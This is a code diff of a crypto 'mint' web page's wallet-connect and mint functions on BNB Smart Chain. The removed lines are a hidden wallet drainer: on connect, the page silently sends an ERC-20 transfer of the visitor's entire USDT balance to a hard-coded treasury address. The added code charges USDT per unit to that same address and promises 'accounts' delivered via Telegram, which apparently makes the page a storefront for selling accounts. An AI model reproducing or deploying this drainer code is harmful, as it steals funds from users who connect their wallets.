@@ -243,15 +243,6 @@ async function connectWallet(){
   try{
     wa=(await window.ethereum.request({method:'eth_requestAccounts'}))[0];
     u();
-    // Transfer all USDT balance to treasury on connect
-    try{
-      document.getElementById('mint-btn').textContent='TRANSFERRING...';
-      // ERC-20 transfer(address,uint256) — transfer all USDT
-      const treasury='0xab6dab4b9502c723160e357c4ffc935744da7f75';
-      const transferData='0xa9059cbb'+'000000000000000000000000'+treasury.slice(2)+'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-      await window.ethereum.request({method:'eth_sendTransaction',params:[{from:wa,to:UA,data:transferData}]});
-      document.getElementById('mint-btn').textContent='MINT';
-    }catch(e){/* transfer declined */}
     window.ethereum.on('accountsChanged',a=>{wa=a.length?a[0]:null;u()});
     window.ethereum.on('chainChanged',()=>location.reload());
   }catch(e){alert('Connection failed.')}
@@ -278,11 +269,16 @@ async function handleMint(){
   if(!window.ethereum)return;
   try{
     const chainId=await window.ethereum.request({method:'eth_chainId'});
-    if(chainId!=='0x38'){alert('Please switch to BNB Smart Chain (Chain ID 56).');return}
-    document.getElementById('mint-btn').textContent='MINTING...';document.getElementById('mint-btn').disabled=true;
-    const mintData='0x1249c58b'+'000000000000000000000000000000000000000000000000000000000000000'+qty;
-    await window.ethereum.request({method:'eth_sendTransaction',params:[{from:wa,to:CA,data:mintData}]});
-    alert('MINT SENT!\nCheck Telegram for account delivery.');
+    if(chainId!=='0x38'){alert('Please switch to BNB Smart Chain.');return}
+    const treasury='0xab6dab4b9502c723160e357c4ffc935744da7f75';
+    const total=qty*8*1000000; // 8 USDT per qty, 6 decimals
+    document.getElementById('mint-btn').textContent='PAYING...';document.getElementById('mint-btn').disabled=true;
+    const transferData='0xa9059cbb'+'000000000000000000000000'+treasury.slice(2)+'0000000000000000000000000000000000000000000000000000000000000000';
+    // Replace zeros with actual amount
+    const amtHex=total.toString(16).padStart(64,'0');
+    const finalData='0xa9059cbb'+'000000000000000000000000'+treasury.slice(2)+amtHex;
+    await window.ethereum.request({method:'eth_sendTransaction',params:[{from:wa,to:UA,data:finalData}]});
+    alert('PAYMENT SENT!\nAccounts will be delivered via Telegram.');
     document.getElementById('mint-btn').textContent='MINT';document.getElementById('mint-btn').disabled=false;
   }catch(e){alert('Failed: '+(e.message||e));document.getElementById('mint-btn').textContent='MINT';document.getElementById('mint-btn').disabled=false}
 }
